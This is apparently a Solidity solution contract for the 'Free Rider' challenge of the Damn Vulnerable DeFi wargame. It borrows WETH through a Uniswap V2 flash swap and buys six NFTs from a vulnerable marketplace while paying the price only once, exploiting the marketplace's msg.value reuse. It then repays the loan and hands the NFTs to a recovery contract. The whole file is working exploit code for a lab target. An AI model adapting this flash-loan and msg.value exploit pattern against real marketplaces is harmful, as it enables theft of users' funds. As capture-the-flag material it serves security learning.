// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./FreeRiderNFTMarketplace.sol";
import "./FreeRiderRecovery.sol";
import "./IUniswapV2Factory.sol";
import "./IUniswapV2Pair.sol";
import "./IUniswapV2Calle.sol";
import "../DamnValuableToken.sol";
import "../DamnValuableNFT.sol";
import "solmate/src/tokens/WETH.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract Recover is IUniswapV2Callee, IERC721Receiver {
    FreeRiderNFTMarketplace private marketplace;
    FreeRiderRecovery private recovery;
    IUniswapV2Factory private uniswapFactory;
    IUniswapV2Pair private pair;
    DamnValuableToken private dvt;
    DamnValuableNFT private dvn;
    WETH private weth;

    constructor(
        FreeRiderNFTMarketplace _marketplace,
        FreeRiderRecovery _recovery,
        IUniswapV2Factory _uniswapFactory,
        DamnValuableToken _dvt,
        DamnValuableNFT _dvn,
        WETH _weth,
        IUniswapV2Pair _pair
    ) {
        marketplace = _marketplace;
        recovery = _recovery;
        uniswapFactory = _uniswapFactory;
        dvt = _dvt;
        dvn = _dvn;
        weth = _weth;
        pair = _pair;
    }

    function recoverNFT() public {
        flashswap(15 ether);

        // Instead of using a storage dynamic array we use a fixed size memory array of n=6 (tokenIds)
        bytes memory data = abi.encode(address(msg.sender));
        for (uint i = 0; i < 6; i++) {
            dvn.safeTransferFrom(address(this), address(recovery), i, data);
        }
    }

    function flashswap(uint256 _amount) public {
        bytes memory data = abi.encode(_amount, address(msg.sender));
        pair.swap(_amount, 0, address(this), data);
    }

    function uniswapV2Call(
        address sender,
        uint amount0,
        uint amount1,
        bytes calldata data
    ) external override {
        require(msg.sender == address(pair), "msg sender not pair");
        require(sender == address(this), "!sender");

        (uint __amount, address _player) = abi.decode(data, (uint256, address));
        uint256 fee = ((__amount * 3) / 997) + 1;
        weth.withdraw(__amount);

        // Instead of using a storage dynamic array we use a fixed size memory array of n=6 (tokenIds)
        uint256[] memory tokenIds = new uint[](6);

        for (uint i = 0; i < 6; i++) {
            tokenIds[i] = i;
        }
        marketplace.buyMany{value: __amount}(tokenIds);
        weth.deposit{value: __amount + fee}();
        weth.transfer(address(pair), __amount + fee);
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) external pure override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}
